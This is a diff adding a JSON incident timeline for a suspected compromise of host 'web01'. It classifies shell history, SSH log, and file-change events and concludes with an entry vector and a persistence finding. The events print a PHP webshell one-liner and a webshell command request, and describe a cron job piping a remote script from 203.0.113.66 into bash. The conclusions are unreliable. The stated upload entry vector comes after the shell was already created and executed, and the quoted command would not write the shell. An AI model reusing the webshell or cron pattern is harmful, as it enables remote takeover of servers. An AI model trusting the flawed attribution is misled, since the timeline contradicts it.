@@ -1,0 +1,556 @@
+{
+  "incident": "web01 suspected compromise, 2026-10-01 early morning (UTC)",
+  "clock_alignment": {
+    "bash_history.txt": "epoch seconds -> UTC (exact)",
+    "auth_excerpt.log": "syslog timestamps; year 2026 inferred from files.txt; tz assumed UTC",
+    "files.txt": "mtimes assumed host-local==UTC; inconsistent with bash_history (mtimes ~36 min earlier than the commands that created the files) -> treated as low confidence"
+  },
+  "events": [
+    {
+      "time_utc": "2026-09-30T18:20:00Z",
+      "source": "evidence/bash_history.txt:2",
+      "type": "shell_command",
+      "event": "cd /var/log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T18:45:00Z",
+      "source": "evidence/bash_history.txt:4",
+      "type": "shell_command",
+      "event": "tail -f app.log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T19:09:00Z",
+      "source": "evidence/bash_history.txt:6",
+      "type": "shell_command",
+      "event": "git pull",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T19:29:00Z",
+      "source": "evidence/bash_history.txt:8",
+      "type": "shell_command",
+      "event": "cd /var/log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T20:08:00Z",
+      "source": "evidence/bash_history.txt:10",
+      "type": "shell_command",
+      "event": "tail -f app.log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T20:38:00Z",
+      "source": "evidence/bash_history.txt:12",
+      "type": "shell_command",
+      "event": "ls -la",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T21:01:00Z",
+      "source": "evidence/bash_history.txt:14",
+      "type": "shell_command",
+      "event": "cd /var/log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T21:14:00Z",
+      "source": "evidence/bash_history.txt:16",
+      "type": "shell_command",
+      "event": "cd /var/log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T21:53:00Z",
+      "source": "evidence/bash_history.txt:18",
+      "type": "shell_command",
+      "event": "git pull",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T22:01:00Z",
+      "source": "evidence/bash_history.txt:20",
+      "type": "shell_command",
+      "event": "cd /var/log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T22:04:00Z",
+      "source": "evidence/bash_history.txt:22",
+      "type": "shell_command",
+      "event": "ls -la",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T22:39:00Z",
+      "source": "evidence/bash_history.txt:24",
+      "type": "shell_command",
+      "event": "tail -f app.log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T22:48:00Z",
+      "source": "evidence/bash_history.txt:26",
+      "type": "shell_command",
+      "event": "systemctl status nginx",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T23:12:00Z",
+      "source": "evidence/bash_history.txt:28",
+      "type": "shell_command",
+      "event": "tail -f app.log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T23:15:00Z",
+      "source": "evidence/bash_history.txt:30",
+      "type": "shell_command",
+      "event": "git pull",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T23:29:00Z",
+      "source": "evidence/bash_history.txt:32",
+      "type": "shell_command",
+      "event": "cd /var/log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T23:44:00Z",
+      "source": "evidence/bash_history.txt:34",
+      "type": "shell_command",
+      "event": "systemctl status nginx",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-09-30T23:59:00Z",
+      "source": "evidence/bash_history.txt:36",
+      "type": "shell_command",
+      "event": "systemctl status nginx",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T00:32:00Z",
+      "source": "evidence/bash_history.txt:38",
+      "type": "shell_command",
+      "event": "git pull",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T00:47:00Z",
+      "source": "evidence/bash_history.txt:40",
+      "type": "shell_command",
+      "event": "tail -f app.log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T00:52:00Z",
+      "source": "evidence/bash_history.txt:42",
+      "type": "shell_command",
+      "event": "cd /var/log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T01:28:00Z",
+      "source": "evidence/bash_history.txt:44",
+      "type": "shell_command",
+      "event": "cd /var/log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T01:53:00Z",
+      "source": "evidence/bash_history.txt:46",
+      "type": "shell_command",
+      "event": "git pull",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T01:58:00Z",
+      "source": "evidence/files.txt:1",
+      "type": "file_mtime",
+      "event": "/etc/passwd (perm 644, owner root)",
+      "classification": "info",
+      "note": "mtime changed but no corroborating evidence; not flagged",
+      "clock": "file mtime, host-local==UTC assumed; LOW confidence (skew/timestomp suspected)"
+    },
+    {
+      "time_utc": "2026-10-01T02:05:00Z",
+      "source": "evidence/files.txt:2",
+      "type": "file_mtime",
+      "event": "/var/www/html/uploads/shell.php (perm 644, owner www-data)",
+      "classification": "malicious",
+      "note": "webshell on disk, owned by www-data (web-server context)",
+      "clock": "file mtime, host-local==UTC assumed; LOW confidence (skew/timestomp suspected)"
+    },
+    {
+      "time_utc": "2026-10-01T02:15:00Z",
+      "source": "evidence/files.txt:3",
+      "type": "file_mtime",
+      "event": "/var/spool/cron/crontabs/www-data (perm 600, owner www-data)",
+      "classification": "malicious",
+      "note": "www-data crontab modified -> persistence (crontab.txt:3)",
+      "clock": "file mtime, host-local==UTC assumed; LOW confidence (skew/timestomp suspected)"
+    },
+    {
+      "time_utc": "2026-10-01T02:16:00Z",
+      "source": "evidence/bash_history.txt:48",
+      "type": "shell_command",
+      "event": "tail -f app.log",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T02:17:00Z",
+      "source": "evidence/auth_excerpt.log:1",
+      "type": "auth_log",
+      "event": "sshd[1005]: Accepted publickey for ops from 10.20.1.31 port 56281 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T02:24:00Z",
+      "source": "evidence/auth_excerpt.log:2",
+      "type": "auth_log",
+      "event": "sshd[1008]: Accepted publickey for ops from 10.20.1.34 port 58472 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T02:33:00Z",
+      "source": "evidence/bash_history.txt:50",
+      "type": "shell_command",
+      "event": "git pull",
+      "classification": "noise",
+      "note": "routine ops command (log tailing / git pull / service status)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T02:40:00Z",
+      "source": "evidence/bash_history.txt:52",
+      "type": "shell_command",
+      "event": "cd /var/www/html/uploads",
+      "classification": "suspicious",
+      "note": "moves into web-uploads dir immediately before webshell write",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T02:41:30Z",
+      "source": "evidence/bash_history.txt:54",
+      "type": "shell_command",
+      "event": "php -r 'system($_GET[cmd]);' > shell.php",
+      "classification": "malicious",
+      "note": "writes PHP webshell (system($_GET[cmd])) into uploads dir",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T02:42:07Z",
+      "source": "evidence/bash_history.txt:56",
+      "type": "shell_command",
+      "event": "crontab -e",
+      "classification": "malicious",
+      "note": "edits crontab -> persistence (see crontab.txt:3)",
+      "clock": "epoch (exact)"
+    },
+    {
+      "time_utc": "2026-10-01T03:18:00Z",
+      "source": "evidence/auth_excerpt.log:3",
+      "type": "auth_log",
+      "event": "sshd[1007]: Accepted publickey for ops from 10.20.1.27 port 54607 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T03:53:00Z",
+      "source": "evidence/auth_excerpt.log:4",
+      "type": "auth_log",
+      "event": "sshd[1006]: Accepted publickey for ops from 10.20.1.22 port 30199 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T04:18:00Z",
+      "source": "evidence/auth_excerpt.log:5",
+      "type": "auth_log",
+      "event": "sshd[1002]: Accepted publickey for ops from 10.20.1.35 port 48764 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T04:24:00Z",
+      "source": "evidence/auth_excerpt.log:6",
+      "type": "auth_log",
+      "event": "sshd[1006]: Accepted publickey for ops from 10.20.1.11 port 48298 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T04:24:00Z",
+      "source": "evidence/auth_excerpt.log:7",
+      "type": "auth_log",
+      "event": "sshd[1007]: Accepted publickey for ops from 10.20.1.18 port 35312 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T04:40:00Z",
+      "source": "evidence/auth_excerpt.log:8",
+      "type": "auth_log",
+      "event": "sshd[1004]: Accepted publickey for ops from 10.20.1.39 port 34669 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T04:56:00Z",
+      "source": "evidence/auth_excerpt.log:9",
+      "type": "auth_log",
+      "event": "sshd[1001]: Accepted publickey for ops from 10.20.1.23 port 42759 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T05:08:00Z",
+      "source": "evidence/auth_excerpt.log:10",
+      "type": "auth_log",
+      "event": "sshd[1001]: Accepted publickey for ops from 10.20.1.17 port 41698 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T05:19:00Z",
+      "source": "evidence/auth_excerpt.log:11",
+      "type": "auth_log",
+      "event": "sshd[1003]: Accepted publickey for ops from 10.20.1.40 port 39116 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T05:45:00Z",
+      "source": "evidence/auth_excerpt.log:12",
+      "type": "auth_log",
+      "event": "sshd[1000]: Accepted publickey for ops from 10.20.1.29 port 41759 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T06:57:00Z",
+      "source": "evidence/auth_excerpt.log:13",
+      "type": "auth_log",
+      "event": "sshd[1004]: Accepted publickey for ops from 10.20.1.24 port 34543 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T07:21:00Z",
+      "source": "evidence/auth_excerpt.log:14",
+      "type": "auth_log",
+      "event": "sshd[1003]: Accepted publickey for ops from 10.20.1.33 port 52806 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T07:38:00Z",
+      "source": "evidence/auth_excerpt.log:15",
+      "type": "auth_log",
+      "event": "sshd[1005]: Accepted publickey for ops from 10.20.1.23 port 36150 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T07:59:00Z",
+      "source": "evidence/auth_excerpt.log:16",
+      "type": "auth_log",
+      "event": "sshd[1002]: Accepted publickey for ops from 10.20.1.29 port 35622 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T08:05:00Z",
+      "source": "evidence/auth_excerpt.log:17",
+      "type": "auth_log",
+      "event": "sshd[1001]: Accepted publickey for ops from 10.20.1.15 port 40912 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T09:10:00Z",
+      "source": "evidence/auth_excerpt.log:18",
+      "type": "auth_log",
+      "event": "sshd[1000]: Accepted publickey for ops from 10.20.1.21 port 34136 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T09:30:00Z",
+      "source": "evidence/auth_excerpt.log:19",
+      "type": "auth_log",
+      "event": "sshd[1003]: Accepted publickey for ops from 10.20.1.27 port 49782 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T09:51:00Z",
+      "source": "evidence/auth_excerpt.log:20",
+      "type": "auth_log",
+      "event": "sshd[1005]: Accepted publickey for ops from 10.20.1.20 port 58267 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T10:14:00Z",
+      "source": "evidence/auth_excerpt.log:21",
+      "type": "auth_log",
+      "event": "sshd[1006]: Accepted publickey for ops from 10.20.1.35 port 45660 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T10:27:00Z",
+      "source": "evidence/auth_excerpt.log:22",
+      "type": "auth_log",
+      "event": "sshd[1008]: Accepted publickey for ops from 10.20.1.24 port 55266 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T11:45:00Z",
+      "source": "evidence/auth_excerpt.log:23",
+      "type": "auth_log",
+      "event": "sshd[1004]: Accepted publickey for ops from 10.20.1.40 port 43530 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T11:52:00Z",
+      "source": "evidence/auth_excerpt.log:24",
+      "type": "auth_log",
+      "event": "sshd[1000]: Accepted publickey for ops from 10.20.1.31 port 58471 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T12:00:00Z",
+      "source": "evidence/auth_excerpt.log:25",
+      "type": "auth_log",
+      "event": "sshd[1002]: Accepted publickey for ops from 10.20.1.26 port 30271 ssh2",
+      "classification": "noise",
+      "note": "ops user, publickey auth from internal 10.20.1.0/24 - routine",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T12:19:00Z",
+      "source": "evidence/auth_excerpt.log:26",
+      "type": "web_access",
+      "event": "GET /uploads/shell.php?cmd=id 200",
+      "classification": "malicious",
+      "note": "webshell executed remotely (?cmd=id)",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    },
+    {
+      "time_utc": "2026-10-01T12:33:00Z",
+      "source": "evidence/auth_excerpt.log:27",
+      "type": "web_access",
+      "event": "POST /upload.php 200 (shell.php)",
+      "classification": "malicious",
+      "note": "ENTRY VECTOR: file upload endpoint used to plant shell.php",
+      "clock": "syslog, year/tz assumed (2026, host-local==UTC)"
+    }
+  ],
+  "conclusions": {
+    "entry_vector": {
+      "finding": "web shell upload via POST /upload.php, shell executed via GET /uploads/shell.php?cmd=id; shell written from www-data context",
+      "evidence": [
+        "evidence/auth_excerpt.log:27",
+        "evidence/auth_excerpt.log:26",
+        "evidence/bash_history.txt:54",
+        "evidence/files.txt:2"
+      ]
+    },
+    "persistence": {
+      "finding": "cron job under www-data pulling and executing a remote script every 5 minutes (curl | bash from 203.0.113.66)",
+      "evidence": [
+        "evidence/crontab.txt:3",
+        "evidence/bash_history.txt:56",
+        "evidence/files.txt:3"
+      ]
+    },
+    "noise_not_flagged": [
+      "evidence/auth_excerpt.log:1-25 (ops SSH logins, internal subnet, publickey)",
+      "evidence/bash_history.txt routine commands: cd /var/log, tail -f app.log, git pull, ls -la, systemctl status nginx",
+      "evidence/files.txt:1 (/etc/passwd mtime change, no corroboration)"
+    ]
+  }
+}
